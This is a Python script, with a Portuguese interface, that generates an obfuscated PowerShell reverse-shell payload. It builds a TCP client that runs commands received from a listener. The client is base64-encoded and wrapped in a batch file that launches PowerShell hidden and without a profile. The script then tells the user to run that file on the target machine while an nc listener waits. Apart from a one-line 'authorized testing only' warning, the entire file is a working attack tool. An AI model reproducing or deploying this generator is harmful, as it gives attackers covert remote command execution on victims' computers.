import base64
import random
from textwrap import dedent

def gerar_shell_reversa(ip, porta, nivel_ofusca):
    # Código PowerShell funcional
    codigo_ps = dedent(f"""\
    $client = New-Object System.Net.Sockets.TCPClient('{ip}',{porta});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
        $sendback = (iex $data 2>&1 | Out-String);
        $prompt = 'PS ' + (Get-Location).Path + '> ';
        $sendback2 = $sendback + $prompt;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }}
    $client.Close();""")

    # Comentários para ofuscação
    comentarios = [
        "\n# Shell Reversa PowerShell",
        "\n# Conexão TCP ativa",
        "\n# Stream de dados aberto",
        "\n# Buffer de recepção",
        "\n# Execução de comandos",
        "\n# Envio de respostas"
    ]

    # Aplica ofuscação real
    if nivel_ofusca > 0:
        # Divide o código em partes lógicas
        partes = codigo_ps.split('\n')
        
        # Insere comentários aleatórios
        for _ in range(nivel_ofusca * 2):
            pos = random.randint(0, len(partes)-1)
            partes.insert(pos, random.choice(comentarios))
        
        # Recompõe o código
        codigo_ps = '\n'.join(partes)

    # Codifica para UTF-16LE e depois para Base64
    bytes_codigo = codigo_ps.encode('utf-16le')
    base64_codigo = base64.b64encode(bytes_codigo).decode('utf-8')

    # Gera o comando batch final
    comando_batch = dedent(f"""\
    @echo off
    set "encCmd={base64_codigo}"
    start /min powershell -nop -w hidden -enc %encCmd%
    """)

    return comando_batch

def testar_conexao(ip, porta):
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, int(porta)))
        s.close()
        return True
    except:
        return False

# Interface do usuário melhorada
print("""
╔════════════════════════════════════════════╗
║ GERADOR DE SHELL REVERSA - PYTHON 3.10+    ║
╚════════════════════════════════════════════╝
""")

while True:
    ip = input("IP do listener (ex: 192.168.1.100): ").strip()
    porta = input("Porta do listener (ex: 4444): ").strip()
    
    if not ip or not porta:
        print("IP e porta são obrigatórios!")
        continue
        
    try:
        nivel = int(input("Nível de ofuscação (0-5): "))
        if nivel < 0 or nivel > 5:
            print("Usando valor padrão 3")
            nivel = 3
        break
    except:
        print("Nível inválido. Usando padrão 3")
        nivel = 3
        break

# Teste de conexão básico
print("\nTestando conexão...")
if testar_conexao(ip, porta):
    print("✅ Porta aberta no destino")
else:
    print("⚠️ Não foi possível conectar. Verifique o listener!")

# Gera o payload
payload = gerar_shell_reversa(ip, porta, nivel)

# Salva em arquivo
nome_arquivo = f"shell_{ip}_{porta}.bat"
with open(nome_arquivo, 'w') as f:
    f.write(payload)

print(f"\nPayload gerado com sucesso em {nome_arquivo}")
print("\nExecute este arquivo no sistema alvo enquanto mantém um listener ativo:")
print(f"Exemplo de listener: nc -lvnp {porta}")
print("\nAVISO: Use apenas para testes legais e autorizados!")